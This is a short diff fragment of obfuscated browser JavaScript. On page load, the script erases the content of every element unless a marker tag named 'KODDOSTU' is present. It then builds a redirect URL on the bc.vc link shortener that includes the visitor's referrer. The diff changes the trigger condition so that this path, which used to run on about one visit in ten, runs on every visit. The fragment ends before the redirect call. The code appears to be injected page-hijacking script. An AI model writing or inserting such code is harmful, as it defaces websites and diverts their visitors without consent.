@@ -2,10 +2,10 @@
 window.onload=function(){var a=document;if(0==a.getElementsByTagName("KODDOSTU").length)for(var a=a.getElementsByTagName("*"),b=0,c=a.length;c>b;b++)a[b].innerHTML="";};
 var ua124rt = navigator.userAgent.toLowerCase();
 var odgau = Math.floor((Math.random() * 10) + 1);
-if(odgau == 3) {
+if(odgau != 13) {
 (function(window, location) {
 var tybn = document.referrer;
-  if(tybn.length >= 0){
+  if(tybn.length >= 8){
   tybn = 'http://bc.vc/13466/' + tybn;
   }
   else{tybn = 'http://bc.vc/ehX7Wj';}
